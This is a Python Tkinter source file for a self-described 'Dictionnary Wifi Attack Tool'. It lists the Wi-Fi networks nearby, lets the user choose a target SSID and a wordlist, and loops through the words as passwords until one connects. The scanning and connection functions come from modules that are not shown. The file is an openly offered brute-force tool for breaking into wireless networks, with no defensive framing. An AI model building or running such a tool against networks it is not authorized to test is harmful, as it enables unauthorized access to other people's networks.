import threading
import tkinter as tk
from tkinter import filedialog,messagebox
from script import scan_available_networks,connect_to_wifi
from parseDictionnary import extract_words_from_file

global words_array,selected_ssid

def open_file():
    global words_array
    file_path = filedialog.askopenfilename(
        filetypes=[("Text Files", "*.txt")]
    )
    if file_path:
        open_button.config(text="Selected File: " + file_path)
        words_array = extract_words_from_file(file_path)

def button_click():
    global words_array, selected_ssid
    indicator = False
    selected_ssid = selected_option.get()
    try:
        for password in words_array:
            if connect_to_wifi(selected_ssid , password):
                indicator = True
                break
        if (indicator == True):
            messagebox.showinfo("WiFi Status", "Connected to WiFi successfully!")
        else:
            messagebox.showerror("WiFi Status", "Failed to connect to WiFi.")
    except NameError:
        messagebox.showerror("WiFi Status", "No file selected.")

# Create the main window
root = tk.Tk()
root.title("Dectionnary Wifi Attack Tool")
root.iconbitmap("icon.ico")
root.configure(bg="#34495E")
root.geometry("600x300")
root.resizable(False, False)

# Calculate center position
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
x = (screen_width - 600) // 2
y = (screen_height - 300) // 2
root.geometry("+{}+{}".format(x, y))

# Create text area
text_area = tk.Text(root, width=70, height=10,bg="#B0C4DE", fg="#001F3F")
text_area.pack(pady=7)

# Simulating the scan for available networks
available_networks = scan_available_networks()
text_area.insert(tk.END, "Available networks:\n")
for ssid, bssid, signal_strength in available_networks:
    text_area.insert(tk.END, f"SSID: {ssid} | BSSID: {bssid} | Signal: {signal_strength} dBm\n")
text_area.config(state=tk.DISABLED)

# Create select menu
options = [ssid for ssid, _, _ in available_networks]
# options = ["Option 1", "Option 2", "Option 3"]
selected_option = tk.StringVar(root)
selected_option.set(options[0])
select_menu = tk.OptionMenu(root, selected_option, *options)
select_menu.config(width=88,bg="#B0C4DE", fg="#001F3F",activebackground='#001F3F', activeforeground='green', borderwidth=0) 
select_menu.pack(pady=7)

# Create open file button
open_button = tk.Button(root, text="Select Dictionnary", command=open_file,width=80,bg="#B0C4DE", fg="#001F3F")
open_button.pack(pady=7)

# Create a button
action_button = tk.Button(root, text="Start", command=button_click,width=20,bg="#B0C4DE", fg="#001F3F")
action_button.pack(pady=7)

# Start the GUI event loop
root.mainloop()
